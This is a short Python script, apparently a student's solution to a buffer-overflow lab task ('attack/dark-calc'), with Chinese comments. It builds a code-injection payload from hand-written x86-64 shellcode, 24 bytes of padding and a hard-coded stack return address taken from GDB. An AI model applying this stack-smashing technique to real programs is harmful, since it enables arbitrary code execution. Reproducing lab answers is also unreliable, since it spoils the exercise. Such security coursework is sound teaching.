#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""

import sys

# 1. 自己编写的机器码
# mov edi, 4
# mov eax, 0x401a87
# call rax
shellcode = bytes.fromhex(
    "bf 04 00 00 00 "
    "b8 87 1a 40 00 "
    "ff d0"
)

# 2. 填充到返回地址的位置（偏移 24 字节）
padding = b"A" * (24 - len(shellcode))

# 3. 覆盖返回地址，使 rip 指向栈上的 shellcode
stack_addr = 0x721000800fd0  # 以当前 GDB 实测地址为准
target = stack_addr.to_bytes(8, "little")

payload = shellcode + padding + target

sys.stdout.buffer.write(payload)
